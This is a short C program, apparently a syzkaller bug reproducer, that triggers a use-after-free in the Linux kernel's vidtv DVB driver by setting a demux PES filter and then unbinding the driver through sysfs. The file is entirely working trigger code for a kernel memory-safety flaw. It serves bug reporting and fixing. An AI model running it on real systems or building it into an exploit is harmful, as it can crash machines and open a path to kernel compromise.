// https://syzkaller.appspot.com/bug?id=f2866fbf0de3dbad4d562cffb405940ad3a3f461
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <glob.h>
#include <sys/ioctl.h>
#include <linux/dvb/dmx.h>

int main(void) {
    glob_t gl;
    char *demux_path = NULL;

    if (glob("/dev/dvb/adapter*/demux0", 0, NULL, &gl) == 0 && gl.gl_pathc > 0) {
        demux_path = strdup(gl.gl_pathv[0]);
        printf("[+] Found demux device: %s\n", demux_path);
    } else {
        printf("[-] No demux device found.\n");
        if (gl.gl_pathc > 0) globfree(&gl);
        return 1;
    }
    globfree(&gl);

    int fd = open(demux_path, O_RDWR);
    if (fd < 0) {
        printf("[-] Failed to open demux device: %s\n", strerror(errno));
        free(demux_path);
        return 1;
    }
    printf("[+] Successfully opened demux device.\n");
    free(demux_path);

    struct dmx_pes_filter_params pesFilterParams;
    memset(&pesFilterParams, 0, sizeof(pesFilterParams));
    pesFilterParams.pid = 0x2000;
    pesFilterParams.input = DMX_IN_FRONTEND;
    pesFilterParams.output = DMX_OUT_TS_TAP;
    pesFilterParams.pes_type = DMX_PES_VIDEO;
    pesFilterParams.flags = DMX_IMMEDIATE_START;

    int res = ioctl(fd, DMX_SET_PES_FILTER, &pesFilterParams);
    if (res < 0) {
        printf("[-] Failed to set PES filter: %s\n", strerror(errno));
        close(fd);
        return 1;
    }
    printf("[+] DMX_SET_PES_FILTER successful.\n");

    int unbind_fd = open("/sys/bus/platform/drivers/vidtv/unbind", O_WRONLY);
    if (unbind_fd < 0) {
        printf("[-] Failed to open unbind: %s\n", strerror(errno));
        close(fd);
        return 1;
    }
    printf("[+] unbind opened successfully.\n");

    const char *driver_name = "vidtv.0";
    ssize_t written = write(unbind_fd, driver_name, strlen(driver_name));
    if (written < 0) {
        printf("[-] Failed to write to unbind: %s\n", strerror(errno));
        close(unbind_fd);
        close(fd);
        return 1;
    }
    printf("[+] Successfully wrote to unbind.\n");

    // Wait for the workqueue to trigger the UAF
    sleep(2);

    close(unbind_fd);
    close(fd);

    return 0;
}
